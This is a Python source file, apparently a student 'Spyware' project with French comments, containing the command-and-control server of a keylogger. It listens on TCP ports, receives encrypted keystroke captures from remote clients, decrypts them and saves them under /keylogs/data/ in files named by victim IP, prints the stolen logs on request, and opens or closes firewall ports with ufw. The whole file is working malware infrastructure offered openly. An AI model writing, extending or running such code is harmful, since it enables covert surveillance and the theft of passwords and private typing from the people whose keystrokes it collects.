import argparse
import os
import socket
import subprocess
import sys
import threading
import time
import glob
import psutil
import chiffrement
from chiffrement import *

from env import *
import datetime

TXT_GLOB = ""


def argument():

    """
         Cette fonction utilise le module argparse pour définir et analyser des arguments de ligne de commande
         pour un programme le projet Spyware.
         :return: L'argument

     """

    p = argparse.ArgumentParser(description='Projet Python - Spyware')
    p.add_argument('-l', '--listen', type=int, help="se met en écoute sur le port TCP saisi par "
                                                               "l'utilisateur et attend les données du spyware UP")
    p.add_argument('-s', '--show', action='store_true', help="affiche la liste des fichiers réceptionnées par le "
                                                             "programme")
    p.add_argument('-r', '--readfile', action='store_true', help="affiche le contenu du fichier stocké sur le serveur "
                                                                 "du spyware. Le contenu doit être parfaitement "
                                                                 "lisible")
    p.add_argument('-k', '--kill', action='store_true',
                   help="arrête toute les instances de serveurs en cours, avertit le spyware de s'arrêter et de "
                        "supprimer la capture.")
    args = p.parse_args()
    return args



def close_port(port):
    if port == 22 or port == 2098:
        print("Pas touche a ce port")
    else :
        print("Fermeture port : "+str(port))
        proto_port = str(port)+"/tcp"
        subprocess.run(["ufw","delete","allow",proto_port])

def open_port(port):
    if port == 22 or port == 2098:
        print("Pas touche")
    else :
        print("Ouverture port : "+str(port))
        proto_port = str(port)+"/tcp"
        subprocess.run(["ufw","allow",proto_port])



def kill_all():
    print("tout tuer  !!")
    pid = os.getpid()
    os.kill(pid, 9)

def chrono():

    """
    Fonction qui permet d'afficher le chronomètre en seconde.
    Si les seconde dépasse les 600 s on lance la fonction Kill all.
    La fonction ne retourne rien

    """

    global TXT_GLOB
    while True:
        seconds = 0
        while True:
            print(f"Secondes : {seconds}")
            seconds += 1
            time.sleep(1)
            if seconds % 10 == 0:
                print("Ajout de data")  # si pas de réponse du client, on kill tout
            if seconds == 600:
                kill_all()


def commands():

    """
    La fonction demande un
    La fonction ne retourne rien
    """

    while True:
        cmd = input(">>>")
        parse = cmd.split()
        if parse[0] == "new":
            #try :
                print(parse[1])
                open_port(int(parse[1]))
                receiver_t = threading.Thread(target=receiver, args=(int(parse[1]),))
                receiver_t.start()
            #except :
            #    print("Erreur dans l'ajout du nouveau client")
        if parse[0] == "kill":
            if parse[1] == "all":
                kill_all()
            elif not parse[1]:
                print("il manque un argument")
            else :
                print(close_port(int(parse[1])))
                print("Client(s) sur port "+parse[1]+" terminated")

    #client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #client_socket.connect((SRV, PORT))
    #client_socket.send(cmd.encode('utf-8'))  # envoi
    #client_socket.close()


def receiver(port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    server_socket.bind(("0.0.0.0", port))

    server_socket.listen(1)

    print(f"Ecoute sur {SRV}:{port}")

    while True:
        client_socket, client_address = server_socket.accept()


        ficname = f"{client_address[0]}-{datetime.date.today()}-keyboard.txt"
        # recu data
        with open("/keylogs/data/" + ficname, "a") as f:
            data = client_socket.recv(1024)
            if data:
                f.write(dechiffrement(data))
                print(f"\n{client_address} - ONLINE")
                print("Update sur /keylogs/data/" + ficname)

    client_socket.close()
    server_socket.close()


if __name__ == '__main__':

    arg = argument()

    if arg.readfile:
        path = '/keylogs/data/'
        fics = glob.glob(os.path.join(path, '*'))
        for fic in fics:
            print("------------------")
            print(fic)
            print("DATA : \n ")
            with open(fic, "r") as f:
                d = f.read()
                print(d)
                print("------------------")
        sys.exit()

    if arg.show and not arg.readfile:
        path = '/keylogs/data/'
        fics = glob.glob(os.path.join(path, '*'))
        for fic in fics:
            print("------------------")
            print(fic)
            print("------------------")
        sys.exit()

    else:

        if arg.listen:
            print(f'Argument -l: {arg.listen}')
            port = arg.listen
        else:
            port = PORT

        receiver_t = threading.Thread(target=receiver, args=(port,))

        receiver_t.start()

        commands_t = threading.Thread(target=commands)

        commands_t.start()
